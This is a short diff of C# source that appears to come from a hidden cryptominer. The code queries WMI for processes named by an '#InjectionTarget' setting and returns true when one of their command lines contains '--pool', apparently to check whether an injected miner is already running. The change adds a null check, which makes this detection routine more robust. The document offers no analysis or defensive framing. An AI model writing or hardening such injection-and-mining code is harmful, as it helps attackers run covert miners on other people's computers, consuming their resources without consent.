@@ -146,14 +146,13 @@ public partial class Program
             options.Impersonation = ImpersonationLevel.Impersonate;
             var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
             scope.Connect();
-
             string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
             var query = new ObjectQuery(wmiQuery);
             var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
             var managementObjectCollection = managementObjectSearcher.Get();
             foreach (ManagementObject retObject in managementObjectCollection)
             {
-                if (retObject != null && retObject["CommandLine"].ToString().Contains("--pool"))
+                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--pool"))
                 {
                     return true;
                 }
